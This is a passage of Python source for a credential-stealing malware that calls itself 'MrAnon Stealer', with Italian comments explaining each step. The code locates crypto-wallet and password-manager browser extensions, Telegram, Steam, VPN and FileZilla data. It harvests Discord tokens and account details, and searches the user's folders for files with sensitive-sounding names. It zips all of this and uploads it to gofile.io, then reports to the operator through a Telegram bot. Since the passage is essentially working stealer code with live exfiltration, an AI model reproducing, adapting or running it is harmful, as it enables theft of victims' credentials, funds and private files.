fixed_paths.update({csRMNG+'\\Telegram Desktop\\tdata': {'category':'Messenger', 'archive_name':'Telegram Desktop'}})
fixed_paths.update({csPFX86+'\\Steam\\config': {'category':'Gaming', 'archive_name':'Steam'}})
fixed_paths.update({csLCL+'\\NordVPN': {'category':'VPN Clients', 'archive_name':'NordVPN'}})
fixed_paths.update({csLCL+'\\ProtonVPN': {'category':'VPN Clients', 'archive_name':'Proton VPN'}})
fixed_paths.update({csRMNG+'\\OpenVPN Connect\\Local Storage\\leveldb': {'category':'VPN Clients', 'archive_name':'OpenVPN Connect'}})
fixed_paths.update({csRMNG+'\\FileZilla': {'category':'Others', 'archive_name':'FileZilla'}})
fixed_paths.update({csLCL+'\\filezilla-server-gui': {'category':'Others', 'archive_name':'FileZilla Server'}})

ch_ext_folders = {}
ch_ext_folders.update({'iopigoikekfcpcapjlkcdlokheickhpc': {'category':'Browser Wallets', 'archive_name': 'Aergo Connect'}})
ch_ext_folders.update({'fhilaheimglignddkjgofkcbgekhenbh': {'category':'Browser Wallets', 'archive_name': 'Atomic Crypto Wallett'}})
ch_ext_folders.update({'cnmamaachppnkjgnildpdmkaakejnhae': {'category':'Browser Wallets', 'archive_name': 'Auro Wallett'}})
ch_ext_folders.update({'bhghoamapcdpbohphigoooaddinpkbai': {'category':'Browser Extensions', 'archive_name': 'Authenticator'}})
ch_ext_folders.update({'gaedmjdfmmahhbjefcbgaolhhanlaolb': {'category':'Browser Extensions', 'archive_name': 'Authy'}})
ch_ext_folders.update({'aodkkagnadcbobfpggfnjeongemjbjca': {'category':'Browser Wallets', 'archive_name': 'BOLT X'}})
ch_ext_folders.update({'fhbohimaelbohpjbbldcngcnapndodjp': {'category':'Browser Wallets', 'archive_name': 'Binance Wallet'}})
ch_ext_folders.update({'okejhknhopdbemmfefjglkdfdhpfmflg': {'category':'Browser Wallets', 'archive_name': 'BitKeep'}})
ch_ext_folders.update({'nngceckbapebfimnlniiiahkandclblb': {'category':'Browser Extensions', 'archive_name': 'Bitwarden'}})
ch_ext_folders.update({'bopcbmipnjdcdfflfgjdgdjejmgpoaab': {'category':'Browser Wallets', 'archive_name': 'BlockWallet'}})
ch_ext_folders.update({'jnlgamecbpmbajjfhmmmlhejkemejdma': {'category':'Browser Wallets', 'archive_name': 'Bravoos Wallet'}})
ch_ext_folders.update({'nhnkbkgjikgcigadomkphalanndcapjk': {'category':'Browser Wallets', 'archive_name': 'CLV Wallet'}})
ch_ext_folders.update({'aeachknmefphepccionboohckonoeemg': {'category':'Browser Wallets', 'archive_name': 'Coin98 Wallet'}})
ch_ext_folders.update({'hnfanknocfeofbddgcijnmhnfnkdnaad': {'category':'Browser Wallets', 'archive_name': 'Coinbase Wallet'}})
ch_ext_folders.update({'dkdedlpgdmmkkfjabffeganieamfklkm': {'category':'Browser Wallets', 'archive_name': 'Cyano Wallet'}})
ch_ext_folders.update({'oeljdldpnmdbchonielidgobddffflal': {'category':'Browser Extensions', 'archive_name': 'EOS Authenticator'}})
ch_ext_folders.update({'cgeeodpfagjceefieflmdfphplkenlfk': {'category':'Browser Wallets', 'archive_name': 'EVER Wallets'}})
ch_ext_folders.update({'kkpllkodjeloidieedojogacfhpaihoh': {'category':'Browser Wallets', 'archive_name': 'EVER Wallets'}})
ch_ext_folders.update({'dgcgofdhhddbmmpolmgcdofiohgklpkk': {'category':'Browser Wallets', 'archive_name': 'Enkrypt'}})
ch_ext_folders.update({'kmhcihpebfmpgmihbkipmjlmmioameka': {'category':'Browser Wallets', 'archive_name': 'Eternl'}})
ch_ext_folders.update({'aholpfdialjgjfhomihkjbmgjidlcdno': {'category':'Browser Wallets', 'archive_name': 'Exodus'}})
ch_ext_folders.update({'ebfidpplhabeedpnhjnobghokpiioolj': {'category':'Browser Wallets', 'archive_name': 'Fewcha Move Wallet'}})
ch_ext_folders.update({'cjmkndjhnagcfbpiemnkdpomccnjblmj': {'category':'Browser Wallets', 'archive_name': 'Finnie'}})
ch_ext_folders.update({'ilgcnhelpchnceeipipijaljkblbcobl': {'category':'Browser Extensions', 'archive_name': 'GAuth Authenticator'}})
ch_ext_folders.update({'bgpipimickeadkjlklgciifhnalhdjhe': {'category':'Browser Wallets', 'archive_name': 'GeroWallet'}})
ch_ext_folders.update({'jnkelfanjkeadonecabehalmbgpfodjm': {'category':'Browser Wallets', 'archive_name': 'Goby'}})
ch_ext_folders.update({'hpglfhgfnhbgpjdenjgmdgoeiappafln': {'category':'Browser Wallets', 'archive_name': 'Guarda'}})
ch_ext_folders.update({'cnncmdhjacpkmjmkcafchppbnpnhdmon': {'category':'Browser Wallets', 'archive_name': 'HAVAH Wallet'}})
ch_ext_folders.update({'gjagmgiddbbciopjhllkdnddhcglnemk': {'category':'Browser Wallets', 'archive_name': 'Hashpak'}})
ch_ext_folders.update({'flpiciilemghbmfalicajoolhkkenfel': {'category':'Browser Wallets', 'archive_name': 'ICONex'}})
ch_ext_folders.update({'cjelfplplebdjjenllpjcblmjkfcffne': {'category':'Browser Wallets', 'archive_name': 'Jaxx Liberty'}})
ch_ext_folders.update({'hcflpincpppdclinealmandijcmnkbgn': {'category':'Browser Wallets', 'archive_name': 'KHC'}})
ch_ext_folders.update({'pdadjkfkgcafgbceimcpbkalnfnepbnk': {'category':'Browser Wallets', 'archive_name': 'KardiaChain Wallet'}})
ch_ext_folders.update({'bfmglfdehkodoiinbclgoppembjfgjkj': {'category':'Browser Extensions', 'archive_name': 'KeePassHelper'}})
ch_ext_folders.update({'fmhmiaejopepamlcjkncpgpdjichnecm': {'category':'Browser Extensions', 'archive_name': 'KeePass Tusk'}})
ch_ext_folders.update({'oboonakemofpalcgghocfoadofidjkkk': {'category':'Browser Extensions', 'archive_name': 'KeePassXC'}})
ch_ext_folders.update({'pdffhmdngciaglkoonimfcmckehcpafo': {'category':'Browser Extensions', 'archive_name': 'KeePassXC'}})
ch_ext_folders.update({'lpilbniiabackdjcionkobglmddfbcjo': {'category':'Browser Wallets', 'archive_name': 'Keeper Wallet'}})
ch_ext_folders.update({'dmkamcknogkgcdfhhbddcghachkejeap': {'category':'Browser Wallets', 'archive_name': 'Keplr'}})
ch_ext_folders.update({'aijcbedoijmgnlmjeegjaglmepbmpkpi': {'category':'Browser Wallets', 'archive_name': 'Leap Terra Wallet'}})
ch_ext_folders.update({'kpfopkelmapcoipemfendmdcghnegimn': {'category':'Browser Wallets', 'archive_name': 'Liquality Wallet'}})
ch_ext_folders.update({'nlbmnnijcnlegkjjpcfjclmcfggfefdm': {'category':'Browser Wallets', 'archive_name': 'MEW CX'}})
ch_ext_folders.update({'gcbjmdjijjpffkpbgdkaojpmaninaion': {'category':'Browser Wallets', 'archive_name': 'MadWallet'}})
ch_ext_folders.update({'efbglgofoippbgcjepnhiblaibcnclgk': {'category':'Browser Wallets', 'archive_name': 'Martian Wallet'}})
ch_ext_folders.update({'afbcbjpbpfadlkmhmclhkeeodmamcflc': {'category':'Browser Wallets', 'archive_name': 'Math Wallet'}})
ch_ext_folders.update({'dfeccadlilpndjjohbjdblepmjeahlmm': {'category':'Browser Wallets', 'archive_name': 'Math Wallet'}})
ch_ext_folders.update({'kfocnlddfahihoalinnfbnfmopjokmhl': {'category':'Browser Wallets', 'archive_name': 'Meta Wallet'}})
ch_ext_folders.update({'nkbihfbeogaeaoehlefnkodbefgpgknn': {'category':'Browser Wallets', 'archive_name': 'MetaMask'}})
ch_ext_folders.update({'ejbalbakoplchlghecdalmeeeajnimhm': {'category':'Browser Wallets', 'archive_name': 'MetaMask'}})
ch_ext_folders.update({'djclckkglechooblngghdinmeemkbgci': {'category':'Browser Wallets', 'archive_name': 'MetaMask'}})
ch_ext_folders.update({'fiedbfgcleddlbcmgdigjgdfcggjcion': {'category':'Browser Extensions', 'archive_name': 'Microsoft Autofill'}})
ch_ext_folders.update({'dngmlblcodfobpdpecaadgfbcggfjfnm': {'category':'Browser Wallets', 'archive_name': 'MultiversX DeFi Wallet'}})
ch_ext_folders.update({'lpfcbjknijpeeillifnkikgncikgfhdo': {'category':'Browser Wallets', 'archive_name': 'Nami'}})
ch_ext_folders.update({'cphhlgmgameodnhkjdmkpanlelnlohao': {'category':'Browser Wallets', 'archive_name': 'NeoLine'}})
ch_ext_folders.update({'jbdaocneiiinmjbjlgalhcelgbejmnid': {'category':'Browser Wallets', 'archive_name': 'Nifty Wallet'}})
ch_ext_folders.update({'fjoaledfpmneenckfbpdfhkmimnjocfa': {'category':'Browser Extensions', 'archive_name': 'NordVPN'}})
ch_ext_folders.update({'mcohilncbfahbmgdjkbpemcciiolgcge': {'category':'Browser Wallets', 'archive_name': 'OKX Wallet'}})
ch_ext_folders.update({'kmphdnilpmdejikjdnlbcnmnabepfgkh': {'category':'Browser Wallets', 'archive_name': 'OsmWallet'}})
ch_ext_folders.update({'mgffkfbidihjpoaomajlbgchddlicgpn': {'category':'Browser Wallets', 'archive_name': 'Pali Wallet'}})
ch_ext_folders.update({'ejjladinnckdgjemekebdpeokbikhfci': {'category':'Browser Wallets', 'archive_name': 'Petra Aptos Wallet'}})
ch_ext_folders.update({'bfnaelmomeimhlpmgjnjophhpkkoljpa': {'category':'Browser Wallets', 'archive_name': 'Phantom'}})
ch_ext_folders.update({'bjnlkgkghpnjgkonekahiadjmgjpmdak': {'category':'Browser Wallets', 'archive_name': 'Polygon Wallet'}})
ch_ext_folders.update({'jojhfeoedkpkglbfimdfabpdfjaoolaf': {'category':'Browser Wallets', 'archive_name': 'Polymesh Wallet'}})
ch_ext_folders.update({'phkbamefinggmakgklpkljjmgibohnba': {'category':'Browser Wallets', 'archive_name': 'Pontem Aptos Wallet'}})
ch_ext_folders.update({'jplgfhpmjnbigmhklmmbgecoobifkmpa': {'category':'Browser Extensions', 'archive_name': 'Proton VPN'}})
ch_ext_folders.update({'acmacodkjbdgmoleebolmdjonilkdbch': {'category':'Browser Wallets', 'archive_name': 'Rabby'}})
ch_ext_folders.update({'fnjhmkhhmkbjkkabndcnnogagogbneec': {'category':'Browser Wallets', 'archive_name': 'Ronin Wallet'}})
ch_ext_folders.update({'kjmoohlgokccodicjjfebfomlbljgfhk': {'category':'Browser Wallets', 'archive_name': 'Ronin Wallet'}})
ch_ext_folders.update({'lgmpcpglpngdoalbgeoldeajfclnhafa': {'category':'Browser Wallets', 'archive_name': 'SafePal Wallet'}})
ch_ext_folders.update({'apenkfbbpmhihehmihndmmcdanacolnh': {'category':'Browser Wallets', 'archive_name': 'SafePal Wallet'}})
ch_ext_folders.update({'epapihdplajcdnnkdeiahlgigofloibg': {'category':'Browser Wallets', 'archive_name': 'Sender Wallet'}})
ch_ext_folders.update({'bhhhlbepdkbapadjdnnojkbgioiodbic': {'category':'Browser Wallets', 'archive_name': 'Solfare Wallet'}})
ch_ext_folders.update({'aiifbnbfobpmeekipheeijimdpnlpgpp': {'category':'Browser Wallets', 'archive_name': 'Station Wallet'}})
ch_ext_folders.update({'opcgpfmipidbgpenhmajoajpbobppdil': {'category':'Browser Wallets', 'archive_name': 'Sui Wallet'}})
ch_ext_folders.update({'eajafomhmkipbjmfmhebemolkcicgfmd': {'category':'Browser Wallets', 'archive_name': 'Tally Ho'}})
ch_ext_folders.update({'ookjlbkiijinhpmnjffcofjonbfbgaoc': {'category':'Browser Wallets', 'archive_name': 'Temple'}})
ch_ext_folders.update({'mnfifefkajgofkcjkemidiaecocnkjeh': {'category':'Browser Wallets', 'archive_name': 'TezBox'}})
ch_ext_folders.update({'imloifkgjagghnncjkhggdhalmcnfklk': {'category':'Browser Extensions', 'archive_name': 'Trezor Password Manager'}})
ch_ext_folders.update({'ibnejdfjmmkpcnlpebklmnkoeoihofec': {'category':'Browser Extensions', 'archive_name': 'Tron Link'}})
ch_ext_folders.update({'pnndplcbkakcplkjnolgbkdgjikjednm': {'category':'Browser Wallets', 'archive_name': 'Tronium'}})
ch_ext_folders.update({'egjidjbpglichdcondbcbdnbeeppgdph': {'category':'Browser Wallets', 'archive_name': 'Trust Wallet'}})
ch_ext_folders.update({'ibljocddagjghmlpgihahamcghfggcjc': {'category':'Browser Wallets', 'archive_name': 'Virgo Wallet'}})
ch_ext_folders.update({'fkhebcilafocjhnlcngogekljmllgdhd': {'category':'Browser Wallets', 'archive_name': 'WAGMIswap.io Wallet'}})
ch_ext_folders.update({'amkmjjmmflddogmhpjloimipbofnfjih': {'category':'Browser Wallets', 'archive_name': 'Wombat'}})
ch_ext_folders.update({'hmeobnfnfcmdkdcmlblgagmfpfboieaf': {'category':'Browser Wallets', 'archive_name': 'XDEFI Wallet'}})
ch_ext_folders.update({'ffnbelfdoeiohenkjibnmadjiehjhajb': {'category':'Browser Wallets', 'archive_name': 'Yoroi'}})
ch_ext_folders.update({'kncchdigobghenbbaddojjnnaogfppfj': {'category':'Browser Wallets', 'archive_name': 'iWallet'}})

dc_token_paths = {}
dc_token_paths['Discord'] = csRMNG + '\\discord'
dc_token_paths['Discord Canary'] = csRMNG + '\\discordcanary'
dc_token_paths['Lightcord'] = csRMNG + '\\Lightcord'
dc_token_paths['Discord PTB'] = csRMNG + '\\discordptb'
dc_token_paths['7Star'] = csLCL + '\\7Star\\7Star\\User Data'
dc_token_paths['Amigo'] = csLCL + '\\Amigo\\User Data'
dc_token_paths['Brave'] = csLCL + '\\BraveSoftware\\Brave-Browser\\User Data'
dc_token_paths['Cent Browser'] = csLCL + '\\CentBrowser\\User Data'
dc_token_paths['Chrome Canary'] = csLCL + '\\Google\\Chrome SxS\\User Data'
dc_token_paths['Epic Privacy Browser'] = csLCL + '\\Epic Privacy Browser\\User Data'
dc_token_paths['Google Chrome'] = csLCL + '\\Google\\Chrome\\User Data'
dc_token_paths['Iridium'] = csLCL + '\\Iridium\\User Data'
dc_token_paths['Kometa'] = csLCL + '\\Kometa\\User Data'
dc_token_paths['Microsoft Edge'] = csLCL + '\\Microsoft\\Edge\\User Data'
dc_token_paths['Opera'] = csRMNG + '\\Opera Software\\Opera Stable'
dc_token_paths['Opera GX'] = csRMNG + '\\Opera Software\\Opera GX Stable'
dc_token_paths['Orbitum'] = csLCL + '\\Orbitum\\User Data'
dc_token_paths['Sputnik'] = csLCL + '\\Sputnik\\Sputnik\\User Data'
dc_token_paths['Torch'] = csLCL + '\\Torch\\User Data'
dc_token_paths['Uran'] = csLCL + '\\uCozMedia\\Uran\\User Data'
dc_token_paths['Vivaldi'] = csLCL + '\\Vivaldi\\User Data'
dc_token_paths['Yandex'] = csLCL + '\\Yandex\\YandexBrowser\\User Data'

#Ottiene dall'elenco dei browser precedenti token di sessione relativi a discord
#Nella funzione cerca infatti i token inizianti per la stringa dQw4w9WgXcQ la quale
#è la parte finale della url di youtube che punta al video di rick astley
tokens = get_all_dc_tokens(dc_token_paths)
main_dc_token = None
all_dc_tokens = ''
#Per ogni token discord trovato preleva il token principale
#estratto da Discord e lo salva in main_dc_token. I restanti li
#aggiunge alla stringa all_dc_tokens
for token,path in tokens:
    if path == 'Discord':
        if main_dc_token is not True:
            main_dc_token = token

    all_dc_tokens += f'{path}: {token}\n'
    
all_dc_tokens_count = len(tokens)
#Dai token preleva altre sensibili informazioni dell'utente utilizzando il link https://discord.com/api/v9/users/@me 
dc_user_name, dc_user_discriminator, dc_phone, dc_email, dc_mfa = get_main_dc_info(tokens)

search_paths = [
    f"{csUSR}\\Desktop",
    f"{csUSR}\\Documents",
    f"{csUSR}\\Downloads",
    f"{csUSR}\\Favorites",
    f"{csUSR}\\Pictures"
]
folders_to_archive = []
files_to_archive = []
categories_count = {}

ch_ext_paths = {
    'Google Chrome': csLCL + '\\Google\\Chrome\\User Data',
    'Microsoft Edge': csLCL + '\\Microsoft\\Edge\\User Data',
    'Opera': csRMNG + '\\Opera Software\\Opera Stable',
    'Opera GX': csRMNG + '\\Opera Software\\Opera Stable'
}

#Per ognuno dei browser in elenco precedente cerca nei vari profili i percorsi a wallet ed estensioni
#raccogliendone i percorsi in files_to_archive
for browser_name,path in ch_ext_paths.items():
    for profile_dir in glob.glob(f'{path}\\*'):
        if os.path.isdir(profile_dir):
            profile_name = os.path.basename(profile_dir)
            
            if profile_name == 'Default':
                profile_name_ext = 'Default'
            else:
                profile_name_ext = profile_name
            
            for folder,folder_info in ch_ext_folders.items():
                category = folder_info['category']
                archive_name = f'{folder_info["archive_name"]} ({browser_name} - {profile_name_ext})'
                folder_path = os.path.join(profile_dir,'Local Extension Settings',folder)
                
                if os.path.exists(folder_path):
                    folders_to_archive.append((folder_path,os.path.join(category,archive_name)))
                    
                    if category in categories_count:
                        categories_count[category] += 1
                    else:
                        categories_count[category] = 1
    
#Ottiene l'indirizzo pubblico del sistema
#interrogando https://api.ipify.org
csSEIPB = csGetEIP()
#Ottiene altre informazioni di geolocalizzazione tramite https://geolocation-db.com/jsonp/
csUID = csGI()

csLSTK = ['кри', 'тра', 'мет', 'бир', 'пар', 'сид', 'впс', 'вдс', 'тел', 'скр', 'рон', 'лог', 'дан', 'рег', 'игр', 'поч', 'дис', 'гуг', '2ф', 'мне', 'лог', 'фр', 
          'screen', 'mdp', 'mot', 'login', 'sec', 'paypal', 'ban', 'met', 'tru', 'see', 'remote', 'mon', 'man', 'ato', 'aw', 'arm', 'cw', 'coin', 'vps', 'vk', 'facebook', 'fb', 'vds', 
          'pas', 'inst', 'pw', 'server', 'vpn', 'go', 'mail', 'default', 'acc', 'ron', 'ph', 'sid', 'eth', 'disc', 'mne', 'disk', 'wal', 'keepass', 'kee', 'cry', 'tel', 'usd', 'ex', 'discord', '2fa', 
          'code', 'memo', 'key', 'compte', 'token', 'backup', 'secret', 'mom', 'family', 'アカウント', 'アプリ', 'パスワード', 'キー', 'コード', 'サーバー', 'セキュリティ', 'ダウンロード', 'データ', 'ドキュメント', 'トークン', 
          'バックアップ', 'パス', 'ファイル', 'ブックマーク', 'メール', 'モニター', 'ユーザー', 'ライブラリ', 'ログイン', 'メッセージ', 'リモート', '帳票', '文書', '注文', '情報', '日記', '番号', '暗号化', '監視', '緊急', '管理者', '重要', '銀行',
         '계정', '보안', '파일', '암호', '비밀번호', '서버', '다운로드', '데이터', '로그인', '키', '코드', '백업', '문서', '주문', '정보', '번역', '메일', '모니터', '유저', '라이브러리', '메시지', '리모트', '매니저', '북마크', '설정', 
         '필수', '월렛', '국제', '보안성', '대시보드', '기록', '감시', '비즈니스', '모바일', '가족']

csLEXT = ['.7z', '.bmp', '.conf', '.csv', '.dat', '.db', '.doc', '.jpeg', '.jpg', '.kdbx', '.key', '.odt', '.ovpn', '.pdf', '.png', '.rar', '.rdp', '.rtf', '.sql', '.tar', '.txt', '.wallet', '.xls', '.xlsx', '.xml', '.zip']

file_counts = {}
#Preleva file da altri applicativi come Desktop Wallet, VPN, Filezilla, Messenger
#ed aggancia il percorso trovato all'elenco dei file da esfiltrare
for fixed_path, folder_info in fixed_paths.items():
    category = folder_info['category']
    archive_name = folder_info['archive_name']
    
    if os.path.exists(fixed_path):
        cat = os.path.join(category, archive_name)
        folders_to_archive.append((fixed_path, cat))
        
        if category in categories_count:
            categories_count[category] += 1
        else:
            categories_count[category] = 1
            
#Cerca nei percorsi delle directory utente file minori di 500MB
#che abbiano una determinata estensione e che nel nome abbiano una delle sottostringhe 
#di csLSTK
for search_path in search_paths:
    for root, dirs, files in os.walk(search_path, topdown=True):
        if root == csUSR:
            dirs[:] = []
        #Per ogni file trovato
        for file in files:
            if file in file_counts:
                file_counts[file] += 1
            file_path = os.path.join(root, file)
            #Se la dimensione supera i 500MB
            if os.path.getsize(file_path) > max_file_size:
                continue
            #preleva l'estensione
            _, file_ext = os.path.splitext(file)

            res = any([x for x in csLSTK if x in file.lower()])
            if file_ext.lower() in csLEXT and res: 
                if file.startswith('.'):
                    base_name,ext = os.path.splitext(file)
                    file_renamed = f'{base_name[1:]}_dot_hidden{ext}'
                else:
                    if file in file_counts:
                        file_counts[file] += 1
                        file_renamed = f'{os.path.splitext(file)[0]}_{file_counts[file]}{file_ext}'
                    else:
                        file_counts[file] = 1
                        file_renamed = file_counts[file]
                files_to_archive.append((os.path.join(root,file),'Files',file_renamed))
                
                if 'Files' in categories_count:
                    categories_count['Files'] += 1
                else:
                    categories_count['Files'] = 1
    
with open(report_path, "w", encoding='utf-16') as report:
    report.write(
        '*********************************************\n'
        '*   _______ ___ ___ _____  ______ _______   *\n'
        '*  |   |   |   |   |     \\|   __ \\   _   |  *\n'
        '*  |       |\\     /|  --  |      <       |  *\n'
        '*  |___|___| |___| |_____/|___|__|___|___|  *\n'
        '*                                           *\n'
        '*         https://t.me/mranontools         *\n'
        '*                                           *\n'
        '*********************************************\n'
        '*                                           *\n'
        f'*    {creation_datetime_str}    *\n'
        '*                                           *\n'
        '*********************************************\n\n'
    )
    
    report.write(f'{csTN}\n'
        f'Worker ID: {csWID}\n\n'
        f'Name: {csUN}\n'
        f'Phone: {dc_phone}\n'
        f'E-Mail: {dc_email}\n'
        f'IP: {csSEIPB}\n'
        f'OS: {csOSN} {csOSR} ({csOSV})\n\n')
    
    for category in categories_order:
        count = categories_count.get(category)
        
        if count and count > 0:
            report.write(f'{custom_category_names.get(category,category)}: {count}\n')
            
            if category == 'Files':
                get_file_name = lambda file_info: os.path.join(file_info[0], file_info[1])

                # Ordinare files_to_archive utilizzando la lambda function come chiave
                sorted_files = sorted(files_to_archive, key=get_file_name)

                # Creare una stringa con i nomi dei file separati da una nuova riga
                files_string = '\n'.join([get_file_name(file_info) for file_info in sorted_files])

                # Scrivere la stringa nel report
                report.write(files_string + '\n')
            else:
                # Creare un dizionario folder_counts per contare il numero di cartelle per categoria
                folder_counts = {}

                # Creare una lista folder_lines per memorizzare le linee da scrivere nel report
                folder_lines = []

                # Ordinare ch_ext_folders in base alla categoria e ottenere la lista ordinata
                sorted_ch_ext_folders = sorted(ch_ext_folders.items(), key=lambda x: x[1]['category'])

                # Creare una lambda function per ottenere il nome della cartella da ciascun elemento
                get_folder_name = lambda folder_info: os.path.join(folder_info[0], folder_info[1]['archive_name'])

                # Iterare sulla lista ordinata delle cartelle
                for folder, folder_info in sorted_ch_ext_folders:
                    # Verificare se la cartella appartiene alla categoria corrente
                    if folder_info['category'] == category:
                        # Verificare se la cartella deve essere archiviata
                        if folder in folders_to_archive:
                            # Ottenere il conteggio corrente per la cartella
                            current_count = folder_counts.get(folder, 0)

                            # Incrementare il conteggio
                            folder_counts[folder] = current_count + 1

                # Iterare sulla lista ordinata delle cartelle
                for folder_path, folder_info in sorted(fixed_paths.items(), key=lambda x: x[1]['category']):
                    # Verificare se la cartella appartiene alla categoria corrente
                    if folder_info['category'] == category:
                        # Verificare se la cartella deve essere archiviata
                        if folder_path in folders_to_archive:
                            # Ottenere il conteggio corrente per la cartella
                            current_count = folder_counts.get(folder_path, 0)

                            # Incrementare il conteggio
                            folder_counts[folder_path] = current_count + 1

                # Iterare sui conteggi delle cartelle
                for folder_name, folder_count in folder_counts.items():
                    # Verificare se ci sono più di una cartella con lo stesso nome
                    if folder_count > 1:
                        # Creare una stringa rappresentante la linea della cartella nel report
                        folder_line = f'└ {folder_name} ({folder_count})'
                    else:
                        folder_line = f'└ {folder_name}'

                    # Aggiungere la linea alla lista folder_lines
                    folder_lines.append(folder_line)

                # Scrivere le linee delle cartelle nel report
                report.write('\n'.join(folder_lines) + '\n')
        report.write("\n")
        
    if all_dc_tokens_count > 0:
        # Scrivere le informazioni relative al report Discord nel file di report
        report.write('✉️ Discord Report:\n')

        # Scrivere il nome utente Discord
        report.write(f'└ Username: {dc_user_name}#{dc_user_discriminator}\n')

        # Scrivere lo stato dell'autenticazione a due fattori (2FA/MFA)
        report.write(f'└ 2FA/MFA: {dc_mfa}\n')

        # Scrivere il conteggio dei token Discord
        report.write(f'└ Tokens Count: {all_dc_tokens_count}\n')

        # Scrivere la sezione dedicata ai token Discord
        report.write('└ Tokens:\n')
        report.write(f'{all_dc_tokens}\n')
        
    if total_browser_logins_count > 0:
        report.write('🔑 Passwords: ')
        report.write(f'{total_browser_logins_count}\n')

        login_lines = [value for value in logins_headers]

        # Scrivere la lista di stringhe nel file di report
        report.write('\n'.join(login_lines))
        report.write('\n')
        
    if total_browser_cookies_count > 0:
        # Scrivere l'intestazione per la sezione dei cookies nel file di report
        report.write('🍪 Cookies: ')
        report.write(f'{total_browser_cookies_count}\n')

        # Creare una lista di stringhe rappresentanti le informazioni sui cookies dei browser
        cookie_lines = [value for value in cookies_headers]

        # Scrivere la lista di stringhe nel file di report
        report.write('\n'.join(cookie_lines))
        report.write('\n')

    if total_browser_ccards_count > 0:
        # Scrivere l'intestazione per la sezione delle carte di credito nel file di report
        report.write('💳 Credit Cards: ')
        report.write(f'{total_browser_ccards_count}\n')

        # Creare una lista di stringhe rappresentanti le informazioni sulle carte di credito dei browser
        ccards_lines = [value for value in ccards_headers]

        # Scrivere la lista di stringhe nel file di report
        report.write('\n'.join(ccards_lines))
        report.write('\n')
        
    report.write('Support: https://t.me/mranontools')
    
zip_data = io.BytesIO()
archive_name = f'Log ({csUN}).zip'
archive_path = os.path.join(csTMP, archive_name)

with pyzipper.AESZipFile(zip_data, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zip_file:
    # Creare una stringa con la formattazione desiderata
    formatted_string = '*********************************************\n*   _______ ___ ___ _____  ______ _______   *\n*  |   |   |   |   |     \\|   __ \\   _   |  *\n*  |       |\\     /|  --  |      <       |  *\n*  |___|___| |___| |_____/|___|__|___|___|  *\n*                                           *\n*         https://t.me/mranontools         *\n*                                           *\n'
    formatted_string += f'*    {creation_datetime_str}    *\n'
    formatted_string += '*********************************************'

    # Convertire la stringa in byte usando l'encoding utf-8
    formatted_bytes = formatted_string.encode('utf-8')

    # Impostare il commento del file ZIP con la stringa formattata
    zip_file.comment = formatted_bytes

    # Impostare la password per il file ZIP come indicato dalla variabile
    zip_file.setpassword(password)
    
    try:
        zip_file.write(screenshot_path, os.path.basename(screenshot_path))
        zip_file.write(report_path, os.path.basename(report_path))
    except:
       pass
    time.sleep(0.1)
    
    for root, dirs, files in os.walk(csBD):
        for file in files:
            file_path = os.path.join(root,file)
            relative_path = os.path.relpath(file_path, csBD)
            archive_file_path = os.path.join('Browser Data', relative_path)
            
            try:
                zip_file.write(file_path, archive_file_path)
            except:
                pass
            time.sleep(0.1)
            
        for dir in dirs:
           # Creare il percorso della directory
            dir_path = os.path.join(root, dir)

            # Creare il percorso relativo
            relative_path = os.path.relpath(dir_path, csBD)

            # Creare il percorso della directory nell'archivio
            archive_dir_path = os.path.join('Browsers Data', relative_path)

            try:
                # Scrivere il percorso della directory nell'archivio ZIP
                zip_file.write(dir_path, archive_dir_path)
            except Exception as e:
                print(f"Errore durante la scrittura nell'archivio: {e}")
                time.sleep(0.1)

    for folder_path,archive_sub_path in folders_to_archive:
        excluded_dirs = []
        for dir_name in os.listdir(folder_path):
            if dir_name.startswith('user data'):
                excluded_dirs.append(dir_name)
        dirs_to_exclude = set(excluded_dirs)
        
        for root,dirs,files in os.walk(folder_path):
            dirs = [d for d in dirs if os.path.isdir(d)]

            files = [f for f in files if os.path.isfile(f) and '.zip' not in f]

            for file in files:
                file_path = os.path.join(root, file)

                if os.path.isfile(file_path):
                    rel_path = os.path.relpath(file_path, folder_path)
                    archive_file_path = os.path.join(archive_sub_path, rel_path)

                    try:
                        zip_file.write(file_path, archive_file_path)
                    except Exception as e:
                        print(f"Errore durante la scrittura nell'archivio: {e}")
                        time.sleep(0.1)
                        
            for dir in dirs:
                dir_path = os.path.join(root, dir)

                if os.path.isdir(dir_path):
                    rel_path = os.path.relpath(dir_path, folder_path)
                    archive_dir_path = os.path.join(archive_sub_path, rel_path)

                    try:
                        zip_file.write(dir_path, archive_dir_path)
                    except Exception as e:
                        print(f"Errore durante la scrittura nella cartella dell'archivio: {e}")
                        time.sleep(0.1)
                
    for file_path, archive_sub_path, file_renamed in files_to_archive:
        archive_file_path = os.path.join(archive_sub_path, file_renamed)

        try:
            zip_file.write(file_path, archive_file_path)
        except Exception as e:
            print(f"Errore durante la scrittura del file nell'archivio: {e}")
            time.sleep(0.1)
            
with open(archive_path, 'wb') as f:
    f.write(zip_data.getbuffer())
#Il file zip creato e compresso viene inviato mediante POST al link
#seguente
try:    
    with open(archive_path, 'rb') as f:
        response = requests.post(
            'https://store1.gofile.io/uploadFile',
            files={'file': f},
        )
        response.raise_for_status()

        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'ok':
                download_link = data['data']['downloadPage']['link']
                short_link = data['data']['downloadPage']['shortLink']
            else:
                raise requests.exceptions.RequestException('API Error')
        else:
            raise requests.exceptions.RequestException('HTTP Error')
except requests.exceptions.RequestException:
    dl_link = 'Error. Contact Support: https://t.me/mranontools'
    dl_s_link = 'Error. Contact Customer.'
except Exception as e:
    dl_link = 'Error. Contact Support: https://t.me/mranontools'
    dl_s_link = 'Error. Contact Customer.'    

#Notifica al canale telegram tramite bot 
#inviando il riepilogo dei dati acquisiti
#il link ai dati esfiltarti
#e la cattura del desktop
telegram_url_G = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
message_body = f'MrAnon Stealer (Telegram Version)\nhttps://t.me/mranontools \n\n👨‍👩‍👧‍👦 Team Name: {csTN}\n👷‍♂️ Worker ID: {csWID}\n\n{csUID}\n💻 OS: {csOSN} {csOSR} ({csOSV})\n\n'

for category in categories_order:
    count = categories_count.get(category, 0)

    if count > 0:
        message_body += custom_category_names.get(category, f"{category}: ") + str(count) + '\n'
        if category == 'Files':
            file_lines = '\n'.join(sorted(files_to_archive, key=lambda x: x['key'])[:2])
            message_body += file_lines
            if len(files_to_archive) > 2:
                message_body += '\n└ ...'

    else:
        folder_counts = {}
        folder_lines = []
        
        for folder, folder_info in sorted(ch_ext_folders.items(), key=lambda x: x[0]):
